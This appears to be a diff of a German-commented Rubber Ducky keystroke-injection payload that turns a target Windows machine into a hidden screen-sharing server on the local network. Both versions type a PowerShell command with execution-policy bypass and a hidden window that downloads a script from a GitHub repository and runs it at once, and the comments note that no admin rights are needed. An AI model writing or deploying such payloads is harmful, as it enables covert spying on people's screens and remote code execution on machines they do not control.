@@ -1,13 +1,13 @@
 ﻿REM Screenshare over LAN - V2 (kein Empfaenger noetig)
 REM Das Ziel stellt seinen Bildschirm selbst per HTTP im LAN bereit.
+REM Schreibt nur in den eigenen Temp-Ordner - keine Adminrechte, kein C:\PS.
 REM Nach dem Start zeigt ein CMD-Fenster die Adresse: http://<IP>:8080/
-REM Diese Adresse im Browser eines beliebigen Geraets im gleichen LAN oeffnen.
-REM Kein Adminrecht noetig (Firewall beim ersten Zugriff bestaetigen).
+REM Diese Adresse im Browser eines Geraets im gleichen LAN oeffnen.
 REM Beenden: ESC auf dem Ziel 5 Sekunden halten.
 REM
 DELAY 2000
 GUI r
 DELAY 1000
-STRING powershell -ExecutionPolicy Bypass -w h -c $d=$env:TEMP+'\ps';md $d -Force;irm https://raw.githubusercontent.com/cypherfrog112358/hak5-payloads/v2.0/s2.ps1 -OutFile $d\x2.ps1;& "$d\x2.ps1"
+STRING powershell -ExecutionPolicy Bypass -w h -c $f=Join-Path ([IO.Path]::GetTempPath()) 'x2.ps1';irm https://raw.githubusercontent.com/cypherfrog112358/hak5-payloads/v2.1/s2.ps1 -OutFile $f;& $f
 DELAY 500
 ENTER
